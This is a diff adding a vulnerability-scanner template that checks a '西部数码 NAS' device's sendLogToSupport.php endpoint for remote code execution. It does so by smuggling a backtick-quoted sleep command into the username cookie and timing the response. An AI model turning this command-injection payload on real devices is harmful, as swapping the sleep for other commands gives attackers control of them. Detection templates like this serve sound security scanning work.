@@ -1,0 +1,29 @@
+id: west-nas-sendlogtosupport-php-rce
+info:
+  name: 西部数码 NAS sendLogToSupport.php 远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  t1: '{{rand_int(4, 9)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /web/php/sendLogToSupport.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: isAdmin=1;username=admin`sleep {{t1}}`
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(content_type, "text/xml")
+          - duration > to_number(t1)
+          - duration < to_number(t2)
+      - type: word
+        words:
+          - "<status>timeout</status>"
+        part: body
